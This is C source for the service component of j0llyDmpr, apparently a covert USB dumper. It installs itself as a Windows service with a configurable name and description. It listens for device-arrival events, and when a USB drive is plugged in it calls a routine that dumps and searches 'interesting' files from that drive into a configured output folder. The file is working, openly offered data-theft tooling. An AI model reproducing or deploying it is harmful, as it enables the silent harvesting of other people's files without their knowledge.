/**
 *   j0llyDmpr
 *   Copyright (C) 2010 Souchet Axel <0vercl0k@tuxfamily.org>
 *
 *   This file is part of j0llyDmpr.
 *
 *   J0llyDmpr is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   J0llyDmpr is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with J0llyDmpr. If not, see <http://www.gnu.org/licenses/>.
**/
#include "service.h"
#include "debug.h"
#include "usb.h"

#include <dbt.h>

/** Global variables **/

SERVICE_STATUS_HANDLE hServStatus = 0;
SERVICE_STATUS servStatus = {0};
BOOL isDone = FALSE;
DWORD logicalVolsPrec = 0;

DWORD servInstall(PCONFIG pConf)
{
    SERVICE_DESCRIPTION servDesc = { pConf->serviceDesc };
    SC_HANDLE hScManager = NULL, hService = NULL;
    UCHAR path[MAX_PATH] = {0};
    DWORD ret = 0, status = 1;

    ret = GetModuleFileName(NULL, (PCHAR)path, MAX_PATH);
    if(ret == 0)
    {
        DEBUGMSG("- Fail to retrieve binary full-qualified path, GetLastError() = %d.\n", GetLastError());
        return 0;
    }

    hScManager = OpenSCManager(
        NULL,
        NULL,
        SC_MANAGER_ALL_ACCESS
    );

    if(hScManager == NULL)
    {
        DEBUGMSG("- Fail to obtain a handle to the service manager, GetLastError() = %d.\n", GetLastError());
        return 0;
    }

    hService = CreateService(
        hScManager,
        pConf->serviceName,
        pConf->serviceName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        (PCHAR)path,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if(hService == NULL)
    {
        DEBUGMSG("- Fail to create the service, GetLastError() = %d.\n", GetLastError());
        status = 0;
        goto clean;
    }

    ChangeServiceConfig2(hService,
        SERVICE_CONFIG_DESCRIPTION,
        &servDesc
    );

    DEBUGMSG("| Service is created.\n");
    CloseServiceHandle(hService);

    clean:
    CloseServiceHandle(hScManager);
    return status;
}

DWORD startServ(const char* pName)
{
    HANDLE hServMngr = NULL, hServ = NULL;
    DWORD ret = 1;

    hServMngr = OpenSCManager(NULL,
        NULL,
        SERVICE_START
    );

    if(hServMngr  == NULL)
    {
        ret = 0;
        goto clean;
    }

    hServ = OpenService(hServMngr,
        pName,
        SERVICE_START
    );

    if(hServ == NULL)
    {
        ret = 0;
        goto clean;
    }

    StartService(hServ,
        0,
        NULL
    );

    clean:
    if(hServ != NULL)
        CloseHandle(hServ);

    if(hServMngr != NULL)
        CloseServiceHandle(hServMngr);

    return ret;
}

VOID WINAPI servMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
    DEV_BROADCAST_DEVICEINTERFACE notifFilter = {0};
    UNREGISTERDEVICENOT UnregisterDeviceNotification = NULL;
    REGISTERDEVICENOT RegisterDeviceNotificationA = NULL;
    HDEVNOTIFY hNotification = NULL;
    PCONFIG pConf = &globalConfiguration;
    HANDLE hLib = NULL;
    BOOL ret = TRUE;

    DEBUGMSG("| Main thread linked successfully to the service manager.\n");

    initUsbStuff(pConf->outputPath);

    hServStatus = RegisterServiceCtrlHandlerEx(pConf->serviceName, ctrlHandler, pConf);

    if(hServStatus == 0)
    {
        DEBUGMSG("- Fail to register the control handler function, GetLastError() = %d.\n", GetLastError());
        return;
    }

    DEBUGMSG("| Control handler function is registered.\n");

    servStatus.dwServiceType	  = SERVICE_WIN32_OWN_PROCESS;
	servStatus.dwCurrentState	  = SERVICE_RUNNING;
	servStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;

    ret = SetServiceStatus(hServStatus, &servStatus);
    if(ret == 0)
    {
        DEBUGMSG("- Fail to inform service manager about service status, GetLastError() = %d.\n", GetLastError());
        return;
    }

    /** Well, now we can doing interesting stuff !1! **/

    DEBUGMSG("| Starting initialization..\n");

    hLib = LoadLibrary("user32.dll");
    RegisterDeviceNotificationA = (REGISTERDEVICENOT)GetProcAddress(hLib, "RegisterDeviceNotificationA");
    UnregisterDeviceNotification = (UNREGISTERDEVICENOT)GetProcAddress(hLib, "UnregisterDeviceNotification");

    if(hLib == NULL || RegisterDeviceNotificationA == NULL || UnregisterDeviceNotification == NULL)
    {
        DEBUGMSG("- Fail to load user32.dlls.\n");
        goto clean;
    }

    DEBUGMSG("| APIs addresses are resolved.\n");

    notifFilter.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE);
    notifFilter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;

    logicalVolsPrec = GetLogicalDrives();

    hNotification = RegisterDeviceNotification(
        (HANDLE)hServStatus,
        &notifFilter,
        DEVICE_NOTIFY_SERVICE_HANDLE|DEVICE_NOTIFY_ALL_INTERFACE_CLASSES
    );

    if(hNotification == NULL)
    {
        DEBUGMSG("- Fail to register a devices notifications, GetLastError() = %d.\n", GetLastError());
        goto clean;
    }

    DEBUGMSG("| Devices notifications registered.\n");


    while(isDone == FALSE)
        Sleep(1);

    clean:

    if(hLib != NULL)
        FreeLibrary(hLib);

    if(hNotification != NULL)
        UnregisterDeviceNotification(hNotification);

    DEBUGMSG("| Stopping the service..\n");
    servStatus.dwCurrentState = SERVICE_STOPPED;

    ret = SetServiceStatus(hServStatus, &servStatus);
    if(ret == 0)
    {
        DEBUGMSG("- Fail to inform service manager about service status, GetLastError() = %d.\n", GetLastError());
        return;
    }
    return;
}

DWORD WINAPI ctrlHandler(DWORD fdwControl, DWORD evtype, PVOID evdata, PVOID Context)
{
    PDEV_BROADCAST_VOLUME pBroadVol = (PDEV_BROADCAST_VOLUME)evdata;
    PCONFIG pConf = (PCONFIG)Context;
    DWORD tmp = GetLogicalDrives();
    UCHAR str[4] = {0, ':', '\\', 0}, letter = 0, ret = 0;

    switch(fdwControl)
    {
        case SERVICE_CONTROL_STOP :
        case SERVICE_CONTROL_SHUTDOWN :
        {
            DEBUGMSG("! Receive a SERVICE_CONTROL_STOP/SHUTDOWN event.\n");
            isDone = TRUE;
            break;
        }

        case SERVICE_CONTROL_DEVICEEVENT :
        {
            if(logicalVolsPrec != tmp)
            {
                DEBUGMSG("! Receive a SERVICE_CONTROL_DEVICEEVENT event\n", evtype);
                if(evtype == DBT_DEVICEREMOVECOMPLETE)
                {
                    DEBUGMSG("x Usb key is removed completely.\n");
                }

                if(evtype == DBT_DEVICEARRIVAL)
                {
                    letter = GetLetterOfNewVolume(logicalVolsPrec, tmp);
                    DEBUGMSG("x Usb key is plugged-in, browse it in '%c:\\\\'.\n", letter);
                    str[0] = letter;

                    ret = DumpAndSearchInteresstingFiles(str, 0, pConf);
                    DEBUGMSG("x DumpAndSearchInteresstingFiles return '%d'.\n", ret);
                }

                logicalVolsPrec = tmp;
            }

            break;
        }

        default :
        {
            DEBUGMSG("! Receive an event unhandled by this service.\n");
        }
    }

    return NO_ERROR;
}

